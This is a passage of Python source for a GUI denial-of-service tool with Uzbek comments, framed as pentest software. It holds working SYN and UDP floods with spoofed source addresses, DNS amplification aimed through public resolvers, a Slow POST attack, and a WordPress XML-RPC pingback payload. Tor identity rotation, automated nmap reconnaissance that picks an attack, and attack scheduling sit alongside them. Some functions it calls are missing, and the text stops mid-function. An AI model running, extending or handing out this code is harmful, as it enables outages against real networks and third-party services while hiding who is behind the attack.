import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk, filedialog, simpledialog
import threading
import random
import time
import logging
import os
import socket
import queue
import json
import sys
import psutil
import re
import requests
import struct
from collections import deque
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from scapy.all import IP, TCP, UDP, ICMP, send, conf, wrpcap, Ether, Raw, fragment,sendp
from scapy.utils import PcapWriter
import numpy as np
import hmac
import hashlib
import schedule
import geoip2.database
from datetime import datetime
import bcrypt
import select
import pdfkit
from fpdf import FPDF
import nmap
from stem import Signal
from stem.control import Controller
import subprocess
import dns.message
import dns.rdatatype
import ipaddress
import folium
from folium.plugins import MarkerCluster
import tempfile
import webbrowser
import concurrent.futures
import pyperclip

# Environment setup for security-kod uchun xavfsiz muhit sozlash
os.environ['PEPPER_SECRET'] = 'secure_pepper_value_here'

# Global variables-global o'zgaruvchilar
stop_flag = False
packet_count = 0
total_bytes = 0
start_time = 0
is_running = False
packet_queue = queue.Queue()
packet_history = deque(maxlen=60)
src_ip_counter = {}
cpu_history = deque(maxlen=60)
ram_history = deque(maxlen=60)
pcap_writer = None
attack_type = "SYN"
stop_conditions = {"cpu": 80, "ram": 80, "network": 90}
user_profiles = {}
current_profile = ""
geo_reader = None
proxy_list = []
scheduled_attack_time = None
last_log_save = time.time()
dry_run = False
dark_mode = False
vpn_connected = False
tor_session = None
target_response_times = []
recon_results = {}
attack_report = {}

# Enhanced password security-kengaytirilgan parol xavfsizligi
def store_password(password):
    PEPPER = os.environ.get('PEPPER_SECRET').encode()
    salt = bcrypt.gensalt()
    peppered_password = password.encode() + PEPPER
    hashed = bcrypt.hashpw(peppered_password, salt)
    with open("password.hash", "wb") as f:
        f.write(salt + b'|' + hashed)

def verify_password():
    try:
        with open("password.hash", "rb") as f:
            data = f.read()
        salt, stored_hash = data.split(b'|', 1)
    except FileNotFoundError:
        messagebox.showerror("Error", "Password file not found!")
        return False
    
    password = simpledialog.askstring("Authentication", "Enter admin password:", show='*')
    if not password:
        return False
    
    PEPPER = os.environ.get('PEPPER_SECRET').encode()
    peppered_password = password.encode() + PEPPER
    
    if bcrypt.checkpw(peppered_password, stored_hash):
        return True
    
    # Failed attempts logging
    logging.warning("Failed login attempt")
    return False

# GeoIP database initialization
def init_geoip():
    global geo_reader
    try:
        geo_reader = geoip2.database.Reader('GeoLite2-City.mmdb')
        logging.info("GeoIP database loaded successfully.")
    except Exception as e:
        logging.warning(f"GeoIP database not found. Geolocation disabled. Error: {str(e)}")
        geo_reader = None

# IP validation
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Port validation
def validate_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

# Random IP generation
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# Private IP validation (RFC 1918)
def validate_source_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private
    except ValueError:
        return False

# Valid private IP generation
def generate_valid_random_ip():
    private_networks = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16')
    ]
    
    while True:
        ip = generate_random_ip()
        try:
            ip_obj = ipaddress.ip_address(ip)
            for network in private_networks:
                if ip_obj in network:
                    return ip
        except ValueError:
            continue

# Time-based HMAC captcha
def generate_secure_captcha():
    secret = b'pentest_secret_key'
    current_time = int(time.time() // 60)  # Changes every minute
    captcha = hmac.new(secret, str(current_time).encode(), hashlib.sha256).hexdigest()[:6].upper()
    return captcha

# Admin privileges check
def check_admin_privileges():
    if os.name == 'nt':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0

# System resource monitoring
def monitor_system():
    global stop_flag, cpu_history, ram_history
    
    while is_running and not stop_flag:
        cpu_percent = psutil.cpu_percent(interval=1)
        ram_percent = psutil.virtual_memory().percent
        
        # Network interface monitoring
        net_io = psutil.net_io_counters()
        net_percent = min(100, net_io.bytes_sent / (1024 * 1024))  # MB sent
        
        # Add to history
        current_time = time.time() - start_time
        cpu_history.append((current_time, cpu_percent))
        ram_history.append((current_time, ram_percent))
        
        # Check thresholds
        if cpu_percent > stop_conditions["cpu"]:
            log_and_display(f"[!] Auto-stop: CPU {cpu_percent}% > {stop_conditions['cpu']}% threshold\n")
            stop_flag = True
        elif ram_percent > stop_conditions["ram"]:
            log_and_display(f"[!] Auto-stop: RAM {ram_percent}% > {stop_conditions['ram']}% threshold\n")
            stop_flag = True
        elif net_percent > stop_conditions["network"]:
            log_and_display(f"[!] Auto-stop: Network {net_percent:.2f}MB > {stop_conditions['network']}MB threshold\n")
            stop_flag = True
            
        time.sleep(1)

# Optimized packet sending
def low_level_send(packets, delay=0):
    global dry_run
    
    if dry_run or not packets:
        return
    
    try:
        if advanced_mode_var.get():
            packets = [Ether() / pkt for pkt in packets]
            sendp(packets, verbose=0, inter=delay)
        else:
            send(packets, verbose=0, inter=delay)
    except Exception as e:
        log_and_display(f"[-] Send error: {str(e)}")

# Optimized SYN Flood
def syn_flood(target_ip, target_port, max_packets=None, delay=0, ttl=None, window=None, batch_size=100):
    global packet_count, stop_flag, is_running, total_bytes, src_ip_counter
    
    local_count = 0
    packet_batch = []
    
    while not stop_flag and (max_packets is None or local_count < max_packets):
        try:
            src_ip = generate_valid_random_ip()
            src_port = random.randint(1024, 65535)
            
            packet = IP(src=src_ip, dst=target_ip)
            if ttl:
                packet.ttl = ttl
            
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            if window:
                tcp_layer.window = window
                
            packet = packet / tcp_layer
            packet_size = len(packet)
            
            src_ip_counter[src_ip] = src_ip_counter.get(src_ip, 0) + 1
            packet_batch.append(packet)
            
            if len(packet_batch) >= batch_size:
                low_level_send(packet_batch, delay)
                
                batch_bytes = sum(len(p) for p in packet_batch)
                packet_count += len(packet_batch)
                total_bytes += batch_bytes
                local_count += len(packet_batch)
                
                output = f"[SYN] Sent {len(packet_batch)} packets to {target_ip}:{target_port}\n"
                log_and_display(output)
                
                if pcap_writer:
                    for pkt in packet_batch:
                        pcap_writer.write(pkt)
                
                packet_batch = []
            
        except Exception as e:
            error_msg = f"[-] Error: {str(e)}\n"
            log_and_display(error_msg)
            time.sleep(1)
    
    if packet_batch:
        low_level_send(packet_batch, delay)
        batch_bytes = sum(len(p) for p in packet_batch)
        packet_count += len(packet_batch)
        total_bytes += batch_bytes
        log_and_display(f"[SYN] Sent final batch of {len(packet_batch)} packets\n")
    
    is_running = False

# Optimized UDP Flood using raw sockets
def optimized_udp_flood(target_ip, target_port, max_packets=None, delay=0, ttl=None, batch_size=100):
    global packet_count, stop_flag, is_running, total_bytes, src_ip_counter
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception as e:
        log_and_display(f"[-] Socket creation failed: {str(e)}\n")
        is_running = False
        return
    
    base_packet = os.urandom(1024)  # 1KB payload
    local_count = 0
    
    def create_ip_header(src_ip, dst_ip, proto, length):
        version_ihl = 69  # 01000101 (version 4, ihl 5)
        tos = 0
        total_length = 20 + 8 + length  # IP header + UDP header + payload
        identification = random.randint(0, 65535)
        flags_frag = 0
        ttl_val = ttl if ttl else 64
        protocol = proto
        checksum = 0
        src = socket.inet_aton(src_ip)
        dst = socket.inet_aton(dst_ip)
        
        header = struct.pack('!BBHHHBBH4s4s', 
                            version_ihl, tos, total_length, 
                            identification, flags_frag, 
                            ttl_val, protocol, checksum, 
                            src, dst)
        return header
    
    while not stop_flag and (max_packets is None or local_count < max_packets):
        try:
            src_ip = generate_valid_random_ip()
            src_port = random.randint(1024, 65535)
            
            # UDP header
            udp_length = 8 + len(base_packet)
            udp_header = struct.pack('!HHHH', src_port, target_port, udp_length, 0)
            
            # IP header
            ip_header = create_ip_header(src_ip, target_ip, 17, len(udp_header + base_packet))
            
            # Full packet
            full_packet = ip_header + udp_header + base_packet
            
            # Send packet
            s.sendto(full_packet, (target_ip, target_port))
            
            # Update counters
            src_ip_counter[src_ip] = src_ip_counter.get(src_ip, 0) + 1
            packet_count += 1
            total_bytes += len(full_packet)
            local_count += 1
            
            if local_count % batch_size == 0:
                output = f"[UDP] Sent {batch_size} packets to {target_ip}:{target_port}\n"
                log_and_display(output)
                if pcap_writer:
                    # Note: Scapy won't see these packets, so we can't log them to pcap
                    pass
            
            if delay:
                time.sleep(delay)
                
        except Exception as e:
            error_msg = f"[-] UDP Error: {str(e)}\n"
            log_and_display(error_msg)
            time.sleep(1)
    
    s.close()
    is_running = False

# DNS Amplification attack
def dns_amplification(target_ip, max_packets=None):
    global packet_count, stop_flag, is_running, total_bytes
    
    # List of open DNS resolvers
    dns_servers = [
        "8.8.8.8", "8.8.4.4",  # Google DNS
        "1.1.1.1", "1.0.0.1",   # Cloudflare
        "9.9.9.9",              # Quad9
        "64.6.64.6", "64.6.65.6" # Verisign
    ]
    
    # Create DNS query (ANY for isc.org - large response)
    query = dns.message.make_query("isc.org", dns.rdatatype.ANY)
    query_data = query.to_wire()
    
    local_count = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_flag and (max_packets is None or local_count < max_packets):
        try:
            dns_server = random.choice(dns_servers)
            src_ip = generate_valid_random_ip()
            
            # Spoof source IP
            ip_header = create_spoofed_ip_header(src_ip, dns_server, 17, len(query_data))
            udp_header = struct.pack('!HHHH', random.randint(1024, 65535), 53, 8 + len(query_data), 0)
            spoofed_packet = ip_header + udp_header + query_data
            
            s.sendto(spoofed_packet, (dns_server, 53))
            
            packet_count += 1
            total_bytes += len(spoofed_packet)
            local_count += 1
            
            output = f"[DNS] Sent amplification request to {dns_server} spoofing {src_ip}\n"
            log_and_display(output)
            
            time.sleep(0.01)
            
        except Exception as e:
            error_msg = f"[-] DNS Amplification Error: {str(e)}\n"
            log_and_display(error_msg)
            time.sleep(1)
    
    s.close()
    is_running = False

# Slow POST attack - sekin post xujumi
def slow_post_attack(target_ip, target_port=80, max_connections=100):
    global stop_flag, is_running
    
    sockets = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)",
        "Mozilla/5.0 (X11; Linux x86_64)"
    ]
    
    # Headers
    headers = [
        "User-Agent: {}".format(random.choice(user_agents)),
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded"
    ]
    
    # Create partial request
    partial_request = "POST / HTTP/1.1\r\n"
    partial_request += "Host: {}\r\n".format(target_ip)
    partial_request += "\r\n".join(headers)
    partial_request += "\r\nContent-Length: 1000000\r\n\r\n"
    
    try:
        # Create connections
        for _ in range(max_connections):
            if stop_flag:
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.send(partial_request.encode())
                sockets.append(s)
            except Exception as e:
                log_and_display(f"[-] Slow POST error: {str(e)}\n")
        
        log_and_display(f"[+] Slow POST: {len(sockets)} connections established\n")
        
        # Keep connections open
        while not stop_flag and sockets:
            for s in sockets:
                try:
                    # Send small chunks of data slowly
                    s.send("a".encode())
                    time.sleep(random.uniform(10, 30))  # Very slow sending
                except:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
            
            time.sleep(5)
            
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    is_running = False

# WordPress XML-RPC attack - wordpres xml xujumi
def wordpress_xmlrpc_attack(target_ip, target_port=80):
    global packet_count, stop_flag, is_running, total_bytes
    
    url = f"http://{target_ip}:{target_port}/xmlrpc.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'text/xml'
    }
    
    # Malicious XML payload
    payload = """<?xml version="1.0" encoding="iso-8859-1"?>
    <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
                <value>
                    <array>
                        <data>
                            <value>
                                <struct>
                                    <member>
                                        <name>methodName</name>
                                        <value>
                                            <string>pingback.ping</string>
                                        </value>
                                    </member>
                                    <member>
                                        <name>params</name>
                                        <value>
                                            <array>
                                                <data>
                                                    <value>
                                                        <string>http://example.com/</string>
                                                    </value>
                                                    <value>
                                                        <string>http://{target}/</string>
                                                    </value>
                                                </data>
                                            </array>
                                        </value>
                                    </member>
                                </struct>
                            </value>
                            <!-- Repeat this block 100+ times -->
                            {repeated_blocks}
                        </data>
                    </array>
                </value>
            </param>
        </params>
    </methodCall>"""
    
    # Create repeated blocks
    block = """
    <value>
        <struct>
            <member>
                <name>methodName</name>
                <value>
                    <string>pingback.ping</string>
                </value>
            </member>
            <member>
                <name>params</name>
                <value>
                    <array>
                        <data>
                            <value>
                                <string>http://example.com/</string>
                            </value>
                            <value>
                                <string>http://{target}/</string>
                            </value>
                        </data>
                    </array>
                </value>
            </member>
        </struct>
    </value>"""
    
    repeated_blocks = block * 150  # Create a large request
    
    full_payload = payload.format(
        target=target_ip,
        repeated_blocks=repeated_blocks
    )
    
    while not stop_flag:
        try:
            # Use Tor session if available
            session = tor_session if tor_session else requests.Session()
            
            # Send request
            response = session.post(url, headers=headers, data=full_payload, timeout=10)
            packet_count += 1
            total_bytes += len(full_payload)
            
            output = f"[WordPress] Sent XML-RPC attack to {url} | Status: {response.status_code}\n"
            log_and_display(output)
            
            time.sleep(0.5)
            
        except Exception as e:
            error_msg = f"[-] WordPress Attack Error: {str(e)}\n"
            log_and_display(error_msg)
            time.sleep(1)
    
    is_running = False

# Tor session setup
def setup_tor_session():
    global tor_session
    
    session = requests.session()
    session.proxies = {
        'http': 'socks5h://localhost:9050',
        'https': 'socks5h://localhost:9050'
    }
    tor_session = session
    log_and_display("[+] Tor session initialized\n")
    return session

# Renew Tor identity
def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            log_and_display("[+] Tor identity renewed\n")
    except Exception as e:
        log_and_display(f"[-] Tor renewal failed: {str(e)}\n")

# Auto-recon module
def auto_recon(target_ip):
    global recon_results
    
    log_and_display(f"[*] Starting reconnaissance on {target_ip}\n")
    
    # Port scanning with Nmap
    nm = nmap.PortScanner()
    nm.scan(target_ip, arguments='-T4 -F')  # Fast scan
    
    recon_results['ports'] = {}
    
    for proto in nm[target_ip].all_protocols():
        ports = nm[target_ip][proto].keys()
        for port in ports:
            service = nm[target_ip][proto][port]['name']
            recon_results['ports'][port] = service
            log_and_display(f"[Recon] Found {proto} port {port}/{service}\n")
    
    # Service detection
    nm.scan(target_ip, arguments='-sV')
    for port, service in recon_results['ports'].items():
        service_info = nm[target_ip].tcp(port)
        if 'product' in service_info:
            recon_results['ports'][port] = f"{service_info['product']} {service_info['version']}"
            log_and_display(f"[Recon] Service: {service_info['product']} {service_info['version']} on port {port}\n")
    
    # OS detection
    nm.scan(target_ip, arguments='-O')
    if 'osmatch' in nm[target_ip]:
        for os_match in nm[target_ip]['osmatch']:
            recon_results['os'] = os_match['name']
            log_and_display(f"[Recon] OS: {os_match['name']} ({os_match['accuracy']}%)\n")
    
    # Vulnerability scanning
    log_and_display("[*] Running vulnerability checks\n")
    # (In a real tool, this would integrate with OpenVAS or similar)
    
    # Save results
    with open(f"recon_{target_ip}.json", "w") as f:
        json.dump(recon_results, f)
    
    log_and_display("[+] Reconnaissance completed\n")
    
    # Auto-select attack based on findings
    if 80 in recon_results['ports'] or 443 in recon_results['ports']:
        return "HTTP"
    elif 22 in recon_results['ports']:
        return "SYN"
    elif 53 in recon_results['ports']:
        return "DNS"
    else:
        return "UDP"

# VPN connection
def connect_vpn(vpn_config):
    global vpn_connected
    
    if not os.path.exists(vpn_config):
        log_and_display(f"[-] VPN config {vpn_config} not found\n")
        return False
    
    try:
        # This would be platform-specific
        if sys.platform == 'win32':
            command = f"openvpn --config {vpn_config}"
        else:
            command = f"sudo openvpn --config {vpn_config}"
        
        # Start in background
        subprocess.Popen(command, shell=True)
        vpn_connected = True
        log_and_display("[+] VPN connection initiated\n")
        return True
    except Exception as e:
        log_and_display(f"[-] VPN connection failed: {str(e)}\n")
        return False

# Generate PDF report
def generate_pdf_report():
    global attack_report
    
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    # Report title
    pdf.cell(200, 10, txt="Penetration Testing Report", ln=True, align='C')
    pdf.ln(10)
    
    # Attack details
    pdf.set_font("Arial", 'B', 12)
    pdf.cell(200, 10, txt="Attack Details", ln=True)
    pdf.set_font("Arial", size=10)
    
    details = [
        f"Target: {attack_report.get('target', 'N/A')}",
        f"Attack Type: {attack_report.get('type', 'N/A')}",
        f"Start Time: {attack_report.get('start_time', 'N/A')}",
        f"Duration: {attack_report.get('duration', 'N/A')}",
        f"Total Packets: {attack_report.get('packets', 0)}",
        f"Total Data: {attack_report.get('bytes', 0)} bytes",
        f"Max Packet Rate: {attack_report.get('max_rate', 0)} pkt/s"
    ]
    
    for detail in details:
        pdf.cell(200, 10, txt=detail, ln=True)
    
    # Recon results
    if recon_results:
        pdf.ln(5)
        pdf.set_font("Arial", 'B', 12)
        pdf.cell(200, 10, txt="Reconnaissance Results", ln=True)
        pdf.set_font("Arial", size=10)
        
        for port, service in recon_results.get('ports', {}).items():
            pdf.cell(200, 10, txt=f"Port {port}: {service}", ln=True)
        
        if 'os' in recon_results:
            pdf.cell(200, 10, txt=f"OS: {recon_results['os']}", ln=True)
    
    # Save report
    filename = f"pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    pdf.output(filename)
    log_and_display(f"[+] Report saved as {filename}\n")
    return filename

# Geolocation data
def get_geolocation(ip):
    if not geo_reader:
        return "GeoIP database not available"
    
    try:
        response = geo_reader.city(ip)
        location = f"{response.country.name}"
        if response.city.name:
            location += f", {response.city.name}"
        return location
    except Exception as e:
        return f"Location unknown: {str(e)}"

# Attack scheduling
def schedule_attack():
    global scheduled_attack_time
    
    time_str = schedule_entry.get().strip()
    if not time_str:
        messagebox.showerror("Error", "Please enter a time (HH:MM)")
        return
    
    try:
        attack_time = datetime.strptime(time_str, "%H:%M").time()
        now = datetime.now().time()
        
        if attack_time > now:
            delay = (attack_time.hour - now.hour) * 3600 + (attack_time.minute - now.minute) * 60
        else:
            delay = (24 - now.hour + attack_time.hour) * 3600 + (attack_time.minute - now.minute) * 60
        
        scheduled_attack_time = time.time() + delay
        
        threading.Timer(delay, start_attack).start()
        log_and_display(f"[+] Attack scheduled for {time_str} ({delay} seconds from now)\n")
    except Exception as e:
        messagebox.showerror("Error", f"Invalid time format: {str(e)}")

# Logging and display
def log_and_display(message):
    global last_log_save
    
    output_box.configure(state='normal')
    output_box.insert(tk.END, message)
    output_box.see(tk.END)
    output_box.configure(state='disabled')
    
    logging.info(message.strip())
    
    current_time = time.time()
    if current_time - last_log_save > 300:
        save_logs()
        last_log_save = current_time

# Save logs
def save_logs():
    log_content = output_box.get("1.0", tk.END)
    log_filename = f"attack_log_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    
    try:
        with open(log_filename, "w") as f:
            f.write(log_content)
        log_and_display(f"[+] Logs saved to {log_filename}\n")
    except Exception as e:
        log_and_display(f"[-] Error saving logs: {str(e)}\n")

# Start attack
def start_attack():
    global stop_flag, packet_count, total_bytes, start_time, is_running, pcap_writer
    global attack_type, current_profile, dry_run, scheduled_attack_time, attack_report
    
    if is_running:
        messagebox.showwarning("Warning", "Attack is already running!")
        return
    
    # Captcha verification
    if not verify_captcha():
        return
    
    # Admin privileges
    if not check_admin_privileges():
        messagebox.showwarning("Warning", "Admin privileges required!")
        return
    
    # Get parameters
    ip = ip_entry.get().strip()
    port = port_entry.get().strip()
    threads = thread_entry.get().strip()
    max_packets = max_packet_entry.get().strip() or None
    attack_type = attack_type_var.get()
    dry_run = dry_run_var.get()
    
    # Auto-recon if enabled
    if auto_recon_var.get():
        attack_type = auto_recon(ip)
        attack_type_var.set(attack_type)
        log_and_display(f"[*] Auto-selected attack type: {attack_type}\n")
    
    # Geolocation
    geo_info = get_geolocation(ip)
    log_and_display(f"[+] Target location: {geo_info}\n")
    
    # PCAP setup
    if pcap_log_var.get():
        pcap_file = filedialog.asksaveasfilename(
            defaultextension=".pcap",
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")],
            title="Save PCAP File"
        )
        if pcap_file:
            pcap_writer = PcapWriter(pcap_file, append=True, sync=True)
    
    # Additional options
    delay = float(delay_entry.get() or 0)
    ttl = int(ttl_entry.get() or 0) or None
    window = int(window_entry.get() or 0) or None
    
    # Auto-stop conditions
    try:
        stop_conditions["cpu"] = int(cpu_limit_entry.get())
        stop_conditions["ram"] = int(ram_limit_entry.get())
        stop_conditions["network"] = int(network_limit_entry.get())
    except ValueError:
        pass
    
    # Validate parameters
    if not ip or not threads:
        messagebox.showerror("Error", "IP and Threads fields are required!")
        return
    
    if not validate_ip(ip):
        messagebox.showerror("Error", "Invalid IP address format!")
        return
    
    if attack_type not in ["ICMP", "DNS", "Slowloris", "PingOfDeath", "WordPress"] and not port:
        messagebox.showerror("Error", "Port is required for this attack type!")
        return
    
    if attack_type not in ["ICMP", "DNS", "Slowloris", "PingOfDeath", "WordPress"] and not validate_port(port):
        messagebox.showerror("Error", "Port must be between 1-65535!")
        return
    
    try:
        threads = int(threads)
        if threads <= 0 or threads > 100:
            messagebox.showerror("Error", "Threads must be between 1-100!")
            return
    except ValueError:
        messagebox.showerror("Error", "Threads must be an integer!")
        return
    
    if max_packets:
        try:
            max_packets = int(max_packets)
            if max_packets <= 0:
                messagebox.showerror("Error", "Packet count must be greater than 0!")
                return
        except ValueError:
            messagebox.showerror("Error", "Packet count must be an integer!")
            return
    
    # Start attack
    stop_flag = False
    packet_count = 0
    total_bytes = 0
    start_time = time.time()
    is_running = True
    packet_history.clear()
    src_ip_counter.clear()
    cpu_history.clear()
    ram_history.clear()
    target_response_times.clear()
    
    # Initialize attack report
    attack_report = {
        "target": f"{ip}:{port}" if port else ip,
        "type": attack_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "threads": threads
    }
    
    # Log setup
    log_filename = f"{attack_type.lower()}_attack_{ip}_{port if port else ''}_{time.strftime('%Y%m%d_%H%M%S')}.log"
    logging.basicConfig(filename=log_filename, level=logging.INFO, 
                        format='%(asctime)s - %(message)s')
    
    log_and_display(f"\n=== {attack_type} ATTACK STARTED ===\n")
    log_and_display(f"Target: {ip}{':' + port if port else ''}\n")
    log_and_display(f"Threads: {threads}\n")
    log_and_display(f"Max packets: {max_packets or 'Unlimited'}\n")
    log_and_display(f"Dry run: {'Enabled' if dry_run else 'Disabled'}\n")
    log_and_display(f"PCAP logging: {'Enabled' if pcap_writer else 'Disabled'}\n")
    log_and_display(f"Auto-stop: CPU > {stop_conditions['cpu']}%, RAM > {stop_conditions['ram']}%, Network > {stop_conditions['network']}MB\n")
    log_and_display("="*50 + "\n")
    
    # Select attack function
    attack_func = None
    args = ()
    kwargs = {
        'max_packets': max_packets,
        'delay': delay,
        'ttl': ttl,
        'window': window
    }
    
    if attack_type == "SYN":
        attack_func = syn_flood
        args = (ip, int(port))
    elif attack_type == "UDP":
        attack_func = optimized_udp_flood
        args = (ip, int(port))
    elif attack_type == "ICMP":
        attack_func = icmp_flood
        args = (ip,)
    elif attack_type == "HTTP":
        attack_func = http_flood
        args = (ip, int(port))
    elif attack_type == "Slowloris":
        attack_func = slowloris_attack
        args = (ip, int(port))
    elif attack_type == "DNS":
        attack_func = dns_amplification
        args = (ip,)
    elif attack_type == "Slow POST":
        attack_func = slow_post_attack
        args = (ip, int(port))
    elif attack_type == "WordPress":
        attack_func = wordpress_xmlrpc_attack
        args = (ip, int(port))
    
    # Start threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack_func, *args, **kwargs)
    
    # Start monitoring
    threading.Thread(target=monitor_system, daemon=True).start()
    
    # Start UI updates
    update_stats()
    update_graph()
    update_top_ips()
    update_target_response(ip)

# Stop attack
def stop_attack():
    global stop_flag, is_running, attack_report
    
    if not is_running:
        return
    
    stop_flag = True
    is_running = False
    
    # Finalize attack report
    duration = time.time() - start_time
    attack_report.update({
        "duration": f"{duration:.2f} seconds",
        "packets": packet_count,
        "bytes": total_bytes,
        "end_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    
    log_and_display("\n[!] ATTACK STOPPED\n")
    
    if pcap_writer:
        pcap_writer.close()
        pcap_writer = None

# Update statistics
def update_stats():
    global packet_count, start_time, is_running, total_bytes
    
    if is_running:
        processed = 0
        while not packet_queue.empty():
            pkt_type, size = packet_queue.get()
            processed += 1
        
        if processed > 0:
            current_time = time.time()
            if packet_history and packet_history[-1][0] == int(current_time):
                packet_history[-1] = (int(current_time), packet_history[-1][1] + processed)
            else:
                packet_history.append((int(current_time), processed))
        
        elapsed = time.time() - start_time
        mins, secs = divmod(elapsed, 60)
        rate = packet_count / elapsed if elapsed > 0 else 0
        bandwidth = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        stats_text = (f"⏱️ Time: {int(mins)}:{int(secs):02d} | "
                      f"📦 Packets: {packet_count} | "
                      f"💾 Total Bytes: {total_bytes} | "
                      f"🚀 Rate: {rate:.2f} pkt/s | "
                      f"🔌 Bandwidth: {bandwidth:.2f} Mbps")
        
        stats_label.config(text=stats_text)
        
        # Update attack report
        attack_report['max_rate'] = max(attack_report.get('max_rate', 0), rate)
        
        root.after(1000, update_stats)
    else:
        stats_label.config(text="📊 Start an attack to see statistics")

# Update response time graph
def update_target_response(target_ip):
    if is_running:
        try:
            start = time.time()
            response = requests.get(f"http://{target_ip}", timeout=2)
            response_time = (time.time() - start) * 1000  # ms
            target_response_times.append(response_time)
            
            if len(target_response_times) > 60:
                target_response_times.pop(0)
        except:
            target_response_times.append(9999)  # Unreachable
        
        root.after(5000, lambda: update_target_response(target_ip))

# Update graph
def update_graph():
    if is_running:
        ax1.clear()
        ax2.clear()
        ax3.clear()
        
        # Packet rate
        if packet_history:
            times = [t[0] for t in packet_history]
            rates = [t[1] for t in packet_history]
            
            color_map = {
                "SYN": "blue",
                "UDP": "green",
                "ICMP": "red",
                "HTTP": "yellow",
                "DNS": "purple",
                "Slowloris": "cyan",
                "Slow POST": "orange",
                "WordPress": "pink"
            }
            color = color_map.get(attack_type, "blue")
            
            ax1.plot(times, rates, color=color, label=f'{attack_type} Rate')
            ax1.fill_between(times, 0, rates, color=color, alpha=0.2)
            ax1.set_title(f"{attack_type} Attack - Packet Rate")
            ax1.set_xlabel('Time (seconds)')
            ax1.set_ylabel('Packets/second')
            ax1.grid(True, linestyle='--', alpha=0.7)
            ax1.legend()
        
        # System resources
        if cpu_history and ram_history:
            cpu_times, cpu_values = zip(*cpu_history)
            ram_times, ram_values = zip(*ram_history)
            
            ax2.plot(cpu_times, cpu_values, 'r-', label='CPU %')
            ax2.plot(ram_times, ram_values, 'b-', label='RAM %')
            ax2.set_title("System Resources")
            ax2.set_xlabel('Time (seconds)')
            ax2.set_ylabel('Percentage')
            ax2.grid(True, linestyle='--', alpha=0.7)
            ax2.legend()
        
        # Target response
        if target_response_times:
            ax3.plot(range(len(target_response_times)), target_response_times, 'g-')
            ax3.set_title("Target Response Time (ms)")
            ax3.set_xlabel('Sample')
            ax3.set_ylabel('Response Time (ms)')
            ax3.grid(True, linestyle='--', alpha=0.7)
        
        canvas.draw()
        root.after(1000, update_graph)

# Update top IPs
def update_top_ips():
    if is_running and src_ip_counter:
        sorted_ips = sorted(src_ip_counter.items(), key=lambda x: x[1], reverse=True)[:10]
        
        top_ips_listbox.delete(0, tk.END)
        for ip, count in sorted_ips:
            location = get_geolocation(ip)
            top_ips_listbox.insert(tk.END, f"{ip}: {count} packets ({location})")
        
        root.after(5000, update_top_ips)

# Generate IP map
def generate_ip_map():
    if not src_ip_counter:
        messagebox.showinfo("Info", "No IP data available")
        return
    
    # Create map
    m = folium.Map(location=[0, 0], zoom_start=2)
    marker_cluster = MarkerCluster().add_to(m)
    
    # Add markers
    for ip, count in src_ip_counter.items():
        try:
            response = geo_reader.city(ip)
            location = [response.location.latitude, response.location.longitude]
            popup = f"{ip}<br>Packets: {count}"
            folium.Marker(location, popup=popup).add_to(marker_cluster)
        except:
            continue
    
    # Save to temp file and open
    with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as f:
        m.save(f.name)
        webbrowser.open(f"file://{f.name}")

# Save profile
def save_profile():
    global user_profiles
    
    profile_name = profile_name_entry.get().strip()
    if not profile_name:
        messagebox.showerror("Error", "Profile name is required!")
        return
    
    profile = {
        "ip": ip_entry.get(),
        "port": port_entry.get(),
        "attack_type": attack_type_var.get(),
        "threads": thread_entry.get(),
        "max_packets": max_packet_entry.get(),
        "pcap_log": pcap_log_var.get(),
        "cpu_limit": cpu_limit_entry.get(),
        "ram_limit": ram_limit_entry.get(),
        "network_limit": network_limit_entry.get(),
        "delay": delay_entry.get(),
        "ttl": ttl_entry.get(),
        "window": window_entry.get(),
        "dry_run": dry_run_var.get(),
        "auto_recon": auto_recon_var.get()
    }
    
    user_profiles[profile_name] = profile
    save_profiles_to_file()
    
    profile_combobox['values'] = list(user_profiles.keys())
    messagebox.showinfo("Success", f"Profile '{profile_name}' saved!")

# Load profile
def load_profile():
    global current_profile
    
    profile_name = profile_combobox.get()
    if not profile_name or profile_name not in user_profiles:
